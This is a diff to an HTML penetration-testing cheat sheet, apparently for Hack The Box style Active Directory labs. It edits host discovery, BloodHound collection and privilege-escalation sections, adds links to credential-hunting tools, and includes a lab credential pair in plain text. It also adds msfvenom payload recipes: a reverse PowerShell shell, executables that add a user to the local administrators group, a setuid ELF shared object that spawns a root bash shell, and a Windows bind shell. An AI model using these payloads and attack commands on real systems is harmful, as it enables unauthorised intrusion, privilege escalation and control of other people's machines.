@@ -194,20 +194,19 @@
   <!-- ===== MASTER PIECE ===== -->
   <h2 id="host-discovery">🖥️ MASTER PIECE</h2>
   <pre class="code"><code># ----
-nxc smb &lt;MS01-IP&gt; --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm -rf /tmp/hosts.tmp
+rmetchots IP
 
-nxc smb &lt;MS02-IP&gt; --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm -rf /tmp/hosts.tmp
+etchosts IP
 
-nxc smb &lt;DC01-IP&gt; --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm -rf /tmp/hosts.tmp
+krb5 IP
 
-nxc smb &lt;DC01-IP&gt; --generate-krb5-file /tmp/krb5.tmp && sudo mv /tmp/krb5.tmp /etc/krb5.conf
-
-sudo fixtime -i MS01 
-sudo fixtime -i DC01 (after pivot)
+sudo fixtime -i IP  (after pivot)
 
 sudo scanner
 
 nxc smb 10.129.4.15/24
+
+autorecon IP
 
 smbmap -H MS01
 
@@ -1097,7 +1096,16 @@ certipy-ad shadow auto -account "MSA_HEALTH$" -k -dc-ip 10.xxxxx -dc-host DC01.L
 bloodhound-python -d domain.htb -u user -p 'pass' -c All --zip -ns &lt;DC_IP&gt;
 nxc ldap &lt;DC_IP&gt; -u user -p pass --bloodhound -c All --dns-server &lt;DC_IP&gt;
 bloodyad -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p Checkpoint2024! get bloodhound
-rusthound-ce -u user -p pass -d checkpoint.htb -i &lt;DC_IP&gt; --ldaps --zip
+
+https://github.com/NH-RED-TEAM/RustHound
+rusthound-ce -u user -p pass --domain checkpoint.htb -i &lt;DC_IP&gt; --ldaps --zip
+
+# clear bloodhond data
+{
+  "deleteCollectedGraphData": true,
+  "deleteFileIngestHistory": true,
+  "deleteDataQualityHistory": true
+}
 
 # Windows (SharpHound)
 .\SharpHound.exe -c All
@@ -1199,7 +1207,14 @@ snmp-check &lt;IP&gt; -c public</code></pre>
 
   <!-- ===== WINDOWS PRIVESC ===== -->
   <h2 id="windows-privesc">🪟 Windows Privilege Escalation</h2>
-  <pre class="code"><code># WinPEAS
+  <pre class="code"><code>
+#privesccheck
+https://github.com/itm4n/PrivescCheck
+
+# Credential-Hunting
+https://github.com/NeCr00/Credential-Hunting
+    
+# WinPEAS
 cp -r /usr/share/peass/winpeas/winPEASx64.exe .
 
 # PowerUp
@@ -1686,6 +1701,9 @@ msfvenom -p cmd/windows/reverse_powershell LHOST=&lt;LHOST&gt; LPORT=4444 -o tas
 # cmd add Windows EXE
 msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup administrators username /add' -f exe > payload.exe
 msfvenom -a x64 --platform Windows -p windows/x64/exec CMD='net localgroup administrators username /add' -f exe -o payload.exe
+
+# cmd add linux binary
+msfvenom -p linux/x64/exec CMD='/bin/bash' -f elf-so -o libmabec.so PrependSetuid=TRUE
 
 # windows bind shell
 msfvenom -p windows/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=4440 -f exe -o shell.exe
